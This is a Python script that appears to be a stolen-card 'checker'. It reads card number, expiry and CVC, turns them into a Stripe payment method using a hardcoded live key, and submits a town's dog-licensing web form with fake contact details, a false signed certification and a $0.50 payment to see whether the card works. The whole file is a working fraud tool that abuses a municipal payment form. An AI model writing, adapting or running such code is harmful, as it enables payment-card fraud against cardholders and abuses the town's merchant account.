import requests,re
import random
def Tele(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	random1 = random.randint(1, 9)
	random2 = random.randint(1, 99)
	random3 = random.randint(20, 999)
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F0048eda7be%3B+stripe-js-v3%2F0048eda7be%3B+card-element&referrer=https%3A%2F%2Fcraftsbury.gov&time_on_page=91886&client_attribution_metadata[client_session_id]=a8384fc2-6468-42c7-bacb-4efb4683a872&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&client_attribution_metadata[wallet_config_id]=64afbf5b-c8e8-4edc-b8c6-4992363eb787&key=pk_live_51KRTq1BT57e58NfuheCTmAYVSOZxx7Xds4bsv7SqOpIp5zwo8aGLRVrG1V9nfgkoveFkelUbnsX71Kr8QuJGxOdY009WSgHBK5'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	cookies = {
	    '_ga_NKXGBC2W51': 'GS2.1.s1776757519$o1$g0$t1776757519$j60$l0$h0',
	    '_ga': 'GA1.1.2045814775.1776757520',
	    '__stripe_mid': 'dd208a86-6460-406e-995e-8c1041c087cb8093ca',
	    '__stripe_sid': '23d45e55-43b9-49f7-8c9c-ec50010cb0119c440f',
	}
	
	headers = {
	    'authority': 'craftsbury.gov',
	    'accept': '*/*',
	    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '_ga_NKXGBC2W51=GS2.1.s1776757519$o1$g0$t1776757519$j60$l0$h0; _ga=GA1.1.2045814775.1776757520; __stripe_mid=dd208a86-6460-406e-995e-8c1041c087cb8093ca; __stripe_sid=23d45e55-43b9-49f7-8c9c-ec50010cb0119c440f',
	    'origin': 'https://craftsbury.gov',
	    'referer': 'https://craftsbury.gov/departments/dog-licensing/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1776757612739',
	}
	
	data = {
	    'data': f'__fluent_form_embded_post_id=12084&_fluentform_10_fluentformnonce=e9c11cb86c&_wp_http_referer=%2Fdepartments%2Fdog-licensing%2F&names_1%5Bfirst_name%5D=&address_1%5Baddress_line_1%5D=&address_1%5Baddress_line_2%5D=&address_1%5Bcity%5D=&address_1%5Bstate%5D=&address_1%5Bzip%5D=&phone=%2B66817480630&email=yellhtetgaung2106{random2}%40gmail.com&names%5Bfirst_name%5D=&input_text_1=&input_text_2=&input_text_3=&input_text_4=&dropdown=&input_radio_1=yes&input_radio=Yes%20-%20%2411&checkbox%5B%5D=By%20checking%20this%20box%2C%20I%20am%20agreeing%20that%20this%20is%20considered%20my%20signature.%20I%20certify%20that%20I%20am%20the%20owner%20of%20the%20dog%20described%20above%20and%20that%20all%20information%20provided%20is%20true%20and%20accurate.%20I%20agree%20that%20this%20electronic%20signature%20has%20the%20same%20legal%20validity%20and%20meaning%20as%20my%20handwritten%20signature%20on%20a%20paper%20document.&custom-payment-amount=0.5&payment_method=stripe&input_radio_5=&input_radio_4=&__stripe_payment_method_id={pm}',
	    'action': 'fluentform_submit',
	    'form_id': '10',
	}
	
	response = requests.post(
	    'https://craftsbury.gov/wp-admin/admin-ajax.php',
	    params=params,
	    #cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return response.text
